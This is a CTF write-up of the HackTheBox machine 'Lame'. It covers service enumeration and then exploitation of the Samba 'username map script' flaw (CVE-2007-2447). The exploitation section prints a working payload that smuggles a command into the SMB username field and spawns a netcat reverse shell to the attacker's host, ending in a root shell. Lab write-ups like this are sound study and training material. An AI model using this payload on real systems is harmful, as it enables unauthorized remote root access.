---
title: "Lame HTB Writeup"
date: 2021-06-14 02:11:20 +0530
categories: [Writeups]
tags: [OSCP, Notes, HTB, Writeups]
description: "My Notes - Lame HackTheBox Writeup"
permalink: /Writeups/Lame-HTB-writeup/
archived: true
---


# Lame - HTB

![Lame HTB](/medias/writeups/HTB/Lame/Lame-desc.png)

Changed HTB Lame original IP address to `192.168.10.10`

## Enumeration

### Nmap

*   -p- –> to scan ports from 1 through 65535
*   -sV –> Version detection
*   -sC –> script scan using the default set of scripts => equivalent to –script=default
*   -A –> Aggressive scan options
*   –min-rate 1000 –> 1000 packets per second
*   –max-retries 5 –> number of times a packet is to be resent on a port to check
*   -Pn - skip host discovery

~~~bash

nmap -p- -sV -sC -A -Pn --min-rate 1000 --max-retries 5 192.168.10.10
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-13 18:14 UTC
Nmap scan report for 192.168.10.10
Host is up (0.15s latency).
Not shown: 65530 filtered ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.10.5
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 2h00m37s, deviation: 2h49m46s, median: 34s
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2021-06-13T14:17:33-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 184.79 seconds

~~~

FTP and Samba looks interesting. 

### Searchsploit

Searching samba 3.0.20 gives a metasploit script(16320.rb), Lets explore without using metasploit. 

```bash
searchsploit samba 3.0.20
---------------------------------------------- ---------------------------------
 Exploit Title                                |  Path
---------------------------------------------- ---------------------------------
Samba 3.0.10 < 3.3.5 - Format String / Securi | multiple/remote/10095.txt
Samba 3.0.20 < 3.0.25rc3 - 'Username' map scr | unix/remote/16320.rb
Samba < 3.0.20 - Remote Heap Overflow         | linux/remote/7701.txt
Samba < 3.0.20 - Remote Heap Overflow         | linux/remote/7701.txt
Samba < 3.6.2 (x86) - Denial of Service (PoC) | linux_x86/dos/36741.py
---------------------------------------------- ---------------------------------
Shellcodes: No Results
```

## FTP

`anonymous:anonymous` FTP Credential worked but cant able to access files.

```
ftp 192.168.10.10
Connected to 192.168.10.10.
220 (vsFTPd 2.3.4)
Name (192.168.10.10:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
226 Directory send OK.
ftp>
```

## Samba

Got Protocol negotiation failed error.
```
sudo smbclient -L 192.168.10.10
protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED
```

To improve security, the NT LAN manager version 1 (NTLMv1) protocol is now disabled by default.

To Enable - Steps as below:
> sudo vi /etc/samba/smb.conf

Add the following settings under “GLOBAL”:  
> client min protocol = CORE  
> client max protocol = SMB3

Now, smbclient can interact.
* -L: lists the services

```bash
smbclient -L 192.168.10.10

Enter WORKGROUP\htb-mukhilan's password: 
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	tmp             Disk      oh noes!
	opt             Disk      
	IPC$            IPC       IPC Service (lame server (Samba 3.0.20-Debian))
	ADMIN$          IPC       IPC Service (lame server (Samba 3.0.20-Debian))
Reconnecting with SMB1 for workgroup listing.
Anonymous login successful

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP            LAME
```

By seeing the permissions on the share drives, tmp folder allows Read & Write access.

```bash
smbmap -H 192.168.10.10
[+] IP: 192.168.10.10:445	Name: 192.168.10.10

        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	tmp                                               	READ, WRITE	oh noes!
	opt                                               	NO ACCESS	
	IPC$                                              	NO ACCESS	IPC Service (lame server (Samba 3.0.20-Debian))
	ADMIN$                                            	NO ACCESS	IPC Service (lame server (Samba 3.0.20-Debian))
```


## CVE-2007-2447 Exploit

From the Enumeration samba 3.0.20 have metasploit script with CVE-2007-2447 - 'Username' map script' Command Execution.

By reading the metasploit script( CVE-2007-2447 ),
> username = "/=`nohup " + payload.encoded + "`"

The issue is in username field. The payload is replaced in `payload.encoded` as below,
> nohup nc -nv 192.168.10.10 4444 -e /bin/sh

```bash
smbclient //192.168.10.10/tmp
Enter WORKGROUP\htb-mukhilan's password: 
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> logon "/=`nohup nc -nv 192.168.10.5 4444 -e /bin/sh`"
Password: 

```

Got the root shell.

```bash
nc -lvp 4444
Listening on 0.0.0.0 4444
Connection received on 192.168.10.10 59960

whoami
root
```


## Reference
https://www.exploit-db.com/exploits/16320
